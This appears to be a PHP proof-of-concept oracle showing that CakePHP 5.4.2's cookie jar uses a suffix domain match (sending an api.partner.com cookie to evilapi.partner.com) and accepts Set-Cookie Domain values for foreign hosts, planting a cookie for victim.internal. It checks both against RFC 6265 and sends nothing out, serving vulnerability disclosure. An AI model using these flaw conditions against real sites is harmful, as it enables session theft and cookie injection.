<?php

declare(strict_types=1);

/**
 * CakePHP 5.4.2 CookieCollection domain-match oracle.
 *
 * Proves leftover #2 from POC-READY.md: findMatchingCookies uses a regex
 * suffix, and addFromResponse stores Set-Cookie Domain= without checking
 * the response host. No exploit payload.
 */

use Cake\Http\Client\Request;
use Cake\Http\Client\Response;
use Cake\Http\Cookie\Cookie;
use Cake\Http\Cookie\CookieCollection;

const WITNESS = 'CAKEPHP-COOKIE-SUFFIX-WITNESS';
const PIN_SHA = '887b641de9f7aba06071f98f17edcbc573cbcf63';
const PIN_VERSION = '5.4.2';
const CAKE_ROOT = '/opt/cakephp';

$path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?: '/';

if ($path === '/health') {
    header('Content-Type: text/plain; charset=utf-8');
    echo "ok\n";
    exit(0);
}

if ($path !== '/' && $path !== '/oracle') {
    http_response_code(404);
    header('Content-Type: text/plain; charset=utf-8');
    echo "not found\n";
    exit(0);
}

require CAKE_ROOT . '/vendor/autoload.php';

function rfc6265_domain_match(string $host, string $domain): bool
{
    $domain = ltrim($domain, '.');
    if ($domain === '') {
        return false;
    }

    return $host === $domain || str_ends_with($host, '.' . $domain);
}

function cookie_header(CookieCollection $jar, string $url): string
{
    $request = $jar->addToRequest(new Request($url));

    return $request->getHeaderLine('Cookie');
}

$versionFile = CAKE_ROOT . '/VERSION.txt';
$versionLines = file($versionFile, FILE_IGNORE_NEW_LINES);
$version = is_array($versionLines) ? (string) end($versionLines) : '';
$gitSha = trim((string) shell_exec('git -C ' . escapeshellarg(CAKE_ROOT) . ' rev-parse HEAD'));

$jar = (new CookieCollection())
    ->add(new Cookie('sid', 'SECRET', null, '/', 'api.partner.com'));

$suffixCookie = cookie_header($jar, 'https://evilapi.partner.com/');
$sameHostCookie = cookie_header($jar, 'https://api.partner.com/');
$controlCookie = cookie_header($jar, 'https://other.com/');

$bankJar = (new CookieCollection())
    ->add(new Cookie('sid', 'SECRET', null, '/', 'bank.com'));
$bankCookie = cookie_header($bankJar, 'https://notbank.com/');

$attackerReq = new Request('https://attacker.test/');
$plantResponse = new Response(
    [
        'HTTP/1.1 200 OK',
        'Set-Cookie: sid=x; Domain=victim.internal; Path=/',
    ],
    '',
);
$planted = (new CookieCollection())->addFromResponse($plantResponse, $attackerReq);
$plantCookie = cookie_header($planted, 'https://victim.internal/');
$plantStoredDomain = '';
foreach ($planted as $cookie) {
    if ($cookie->getName() === 'sid') {
        $plantStoredDomain = $cookie->getDomain();
        break;
    }
}

$payload = [
    'version' => $version,
    'git_sha' => $gitSha,
    'pin_sha' => PIN_SHA,
    'witness' => WITNESS,
    'suffix_host' => 'evilapi.partner.com',
    'suffix_cookie' => $suffixCookie,
    'same_host_cookie' => $sameHostCookie,
    'control_host' => 'other.com',
    'control_cookie' => $controlCookie,
    'bank_cookie' => $bankCookie,
    'plant_cookie' => $plantCookie,
    'plant_stored_domain' => $plantStoredDomain,
    'rfc6265_suffix' => rfc6265_domain_match('evilapi.partner.com', 'api.partner.com'),
    'rfc6265_bank' => rfc6265_domain_match('notbank.com', 'bank.com'),
    'rfc6265_control' => rfc6265_domain_match('other.com', 'api.partner.com'),
    'rfc6265_same' => rfc6265_domain_match('api.partner.com', 'api.partner.com'),
];

header('Content-Type: application/json; charset=utf-8');
echo json_encode($payload, JSON_THROW_ON_ERROR | JSON_UNESCAPED_SLASHES) . "\n";
